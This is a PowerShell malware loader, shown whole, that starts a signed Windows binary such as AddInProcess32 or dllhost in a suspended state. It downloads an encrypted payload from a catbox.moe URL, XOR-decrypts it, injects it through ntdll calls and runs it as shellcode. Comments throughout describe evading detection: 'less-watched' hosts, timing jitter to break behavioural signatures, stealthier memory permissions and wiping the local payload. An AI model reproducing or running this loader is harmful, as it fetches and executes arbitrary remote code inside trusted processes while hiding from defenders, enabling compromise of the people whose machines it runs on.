param(
    [string]$Target,
    [string]$Url = "https://files.catbox.moe/nfasiv.bin",
    [string]$Key = "",
    [switch]$RequireRWX
)

# Native API setup via inline C#
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class EniNative {
    [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    public static extern bool CreateProcessW(
        IntPtr lpApplicationName,
        IntPtr lpCommandLine,
        IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes,
        bool bInheritHandles,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        IntPtr lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("ntdll.dll")]
    public static extern int NtAllocateVirtualMemory(
        IntPtr ProcessHandle,
        ref IntPtr BaseAddress,
        IntPtr ZeroBits,
        ref IntPtr RegionSize,
        uint AllocationType,
        uint Protect);

    [DllImport("ntdll.dll")]
    public static extern int NtProtectVirtualMemory(
        IntPtr ProcessHandle,
        ref IntPtr BaseAddress,
        ref IntPtr RegionSize,
        uint NewProtect,
        out uint OldProtect);

    [DllImport("ntdll.dll")]
    public static extern int NtWriteVirtualMemory(
        IntPtr ProcessHandle,
        IntPtr BaseAddress,
        byte[] Buffer,
        uint NumberOfBytesToWrite,
        out uint NumberOfBytesWritten);

    [DllImport("ntdll.dll")]
    public static extern int NtCreateThreadEx(
        out IntPtr hThread,
        uint DesiredAccess,
        IntPtr ObjectAttributes,
        IntPtr ProcessHandle,
        IntPtr StartAddress,
        IntPtr Parameter,
        bool CreateSuspended,
        uint StackZeroBits,
        uint SizeOfStackCommit,
        uint SizeOfStackReserve,
        IntPtr BytesBuffer);

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }
}
"@

function Invoke-XorDecrypt {
    param([byte[]]$Data, [string]$Key)
    if ([string]::IsNullOrEmpty($Key)) { return $Data }
    $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($Key)
    $out = New-Object byte[] $Data.Length
    for ($i = 0; $i -lt $Data.Length; $i++) {
        $out[$i] = $Data[$i] -bxor $keyBytes[$i % $keyBytes.Length]
    }
    return $out
}

# Host process selection — prefer less-watched signed system binaries
$hostPath = $null
if ($Target) {
    $hostPath = $Target
    Write-Host "User-specified host: $hostPath"
} else {
    # Prefer AddInProcess32 per LO's request
    $netDirs = @(
        "C:\Windows\Microsoft.NET\Framework64\v4.0.30319",
        "C:\Windows\Microsoft.NET\Framework\v4.0.30319",
        "C:\Windows\Microsoft.NET\Framework64\v2.0.50727",
        "C:\Windows\Microsoft.NET\Framework\v2.0.50727"
    )
    foreach ($dir in $netDirs) {
        $candidate = Join-Path $dir "AddInProcess32.exe"
        if (Test-Path $candidate) {
            $hostPath = $candidate
            break
        }
    }
    # Fallback to less-watched signed binaries
    if (-not $hostPath) {
        $candidates = @(
            "C:\Windows\System32\RuntimeBroker.exe",
            "C:\Windows\SysWOW64\RuntimeBroker.exe",
            "C:\Windows\System32\dllhost.exe",
            "C:\Windows\SysWOW64\dllhost.exe",
            "C:\Windows\System32\WerFault.exe",
            "C:\Windows\SysWOW64\WerFault.exe"
        )
        foreach ($p in $candidates) {
            if (Test-Path $p) {
                $hostPath = $p
                break
            }
        }
    }
    if (-not $hostPath) {
        $netDirs = @(
            "C:\Windows\Microsoft.NET\Framework64\v4.0.30319",
            "C:\Windows\Microsoft.NET\Framework\v4.0.30319",
            "C:\Windows\Microsoft.NET\Framework64\v2.0.50727",
            "C:\Windows\Microsoft.NET\Framework\v2.0.50727"
        )
        foreach ($dir in $netDirs) {
            $candidate = Join-Path $dir "AddInProcess32.exe"
            if (Test-Path $candidate) {
                $hostPath = $candidate
                break
            }
        }
    }
    if (-not $hostPath) {
        $regasmPaths = @(
            "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegAsm.exe",
            "C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegAsm.exe",
            "C:\Windows\Microsoft.NET\Framework64\v2.0.50727\RegAsm.exe",
            "C:\Windows\Microsoft.NET\Framework\v2.0.50727\RegAsm.exe"
        )
        foreach ($p in $regasmPaths) {
            if (Test-Path $p) {
                $hostPath = $p
                break
            }
        }
    }
}

if (-not $hostPath) {
    throw "No suitable host process found."
}
Write-Host "Selected host: $hostPath"

# Small random delay to break behavioral timing signatures
$jitter = Get-Random -Minimum 1500 -Maximum 3500
Start-Sleep -Milliseconds $jitter

# Create suspended host process
$si = New-Object EniNative+STARTUPINFO
$si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($si)
$pi = New-Object EniNative+PROCESS_INFORMATION

$CREATE_SUSPENDED = 0x00000004
$CREATE_NO_WINDOW = 0x08000000

$cmdLinePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni("`"$hostPath`"")
try {
    $ok = [EniNative]::CreateProcessW(
        [IntPtr]::Zero,
        $cmdLinePtr,
        [IntPtr]::Zero,
        [IntPtr]::Zero,
        $false,
        $CREATE_SUSPENDED -bor $CREATE_NO_WINDOW,
        [IntPtr]::Zero,
        [IntPtr]::Zero,
        [ref]$si,
        [ref]$pi
    )
} finally {
    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($cmdLinePtr)
}

if (-not $ok) {
    throw "CreateProcessW failed. Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
}
Write-Host "Host spawned. PID: $($pi.dwProcessId)"

# Download payload
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$wc = New-Object System.Net.WebClient
$wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
$encrypted = $wc.DownloadData($Url)
Write-Host "Downloaded $($encrypted.Length) bytes from $Url"

# Decrypt payload in local memory
$payload = Invoke-XorDecrypt -Data $encrypted -Key $Key

# Allocate memory inside the remote host as RW first (stealthier than RWX)
$baseAddress = [IntPtr]::Zero
$regionSize = [IntPtr]$payload.Length
$MEM_COMMIT = 0x1000
$MEM_RESERVE = 0x2000
$PAGE_READWRITE = 0x04
$PAGE_EXECUTE_READ = 0x20
$PAGE_EXECUTE_READWRITE = 0x40

$status = [EniNative]::NtAllocateVirtualMemory(
    $pi.hProcess,
    [ref]$baseAddress,
    [IntPtr]::Zero,
    [ref]$regionSize,
    $MEM_COMMIT -bor $MEM_RESERVE,
    $PAGE_READWRITE
)

if ($status -ne 0) {
    throw "NtAllocateVirtualMemory failed. NTSTATUS: 0x$($status.ToString('X8'))"
}
Write-Host "Allocated remote memory at 0x$($baseAddress.ToString('X'))"

# Write decrypted payload into remote host
$bytesWritten = 0
$status = [EniNative]::NtWriteVirtualMemory(
    $pi.hProcess,
    $baseAddress,
    $payload,
    [uint32]$payload.Length,
    [ref]$bytesWritten
)

if ($status -ne 0) {
    throw "NtWriteVirtualMemory failed. NTSTATUS: 0x$($status.ToString('X8'))"
}
Write-Host "Wrote $bytesWritten bytes into host process"

# Cleanup local payload footprint
$encrypted = $null
$payload = $null
[System.GC]::Collect()

# Flip memory protection to execute-only (RX) or RWX if requested
$finalProtect = if ($RequireRWX) { $PAGE_EXECUTE_READWRITE } else { $PAGE_EXECUTE_READ }
$oldProtect = 0
$status = [EniNative]::NtProtectVirtualMemory(
    $pi.hProcess,
    [ref]$baseAddress,
    [ref]$regionSize,
    $finalProtect,
    [ref]$oldProtect
)

if ($status -ne 0) {
    throw "NtProtectVirtualMemory failed. NTSTATUS: 0x$($status.ToString('X8'))"
}
Write-Host "Memory protection changed to $(if($RequireRWX){'RWX'}else{'RX'})"

# Create remote thread to execute shellcode
$threadHandle = [IntPtr]::Zero
$THREAD_ALL_ACCESS = 0x1FFFFF

$status = [EniNative]::NtCreateThreadEx(
    [ref]$threadHandle,
    $THREAD_ALL_ACCESS,
    [IntPtr]::Zero,
    $pi.hProcess,
    $baseAddress,
    [IntPtr]::Zero,
    $false,
    0,
    0,
    0,
    [IntPtr]::Zero
)

if ($status -ne 0) {
    throw "NtCreateThreadEx failed. NTSTATUS: 0x$($status.ToString('X8'))"
}
Write-Host "Remote thread created. Monitoring host process..."

# Monitor host process every 8 seconds
$hostProc = Get-Process -Id $pi.dwProcessId -ErrorAction SilentlyContinue
while ($hostProc -and -not $hostProc.HasExited) {
    $hostProc.Refresh()
    $ws = [math]::Round($hostProc.WorkingSet64 / 1KB, 2)
    $tc = $hostProc.Threads.Count
    Write-Host "$(Get-Date -Format 'HH:mm:ss') | PID: $($pi.dwProcessId) | WS: ${ws} KB | Threads: $tc"
    Start-Sleep -Seconds 8
    $hostProc = Get-Process -Id $pi.dwProcessId -ErrorAction SilentlyContinue
}

Write-Host "Host process exited."
